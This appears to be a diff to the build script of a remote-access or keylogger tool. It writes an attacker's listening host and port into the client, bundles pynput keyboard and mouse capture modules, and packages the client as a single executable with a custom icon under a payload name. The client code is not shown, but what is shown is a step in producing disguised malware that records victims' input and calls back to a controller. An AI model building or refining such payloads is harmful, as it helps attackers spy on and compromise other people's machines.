@@ -35,7 +35,7 @@ read -ep $'
 echo lhost = "'$lhost'" > client/data.py
 echo lport = $lport >> client/data.py
 
-pyinstaller client/client.py --onefile --icon=$icon
+pyinstaller client/client.py --onefile --icon=$icon  --hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32
 
 mv dist/client $payload_name
 rm -rf dist/ build/
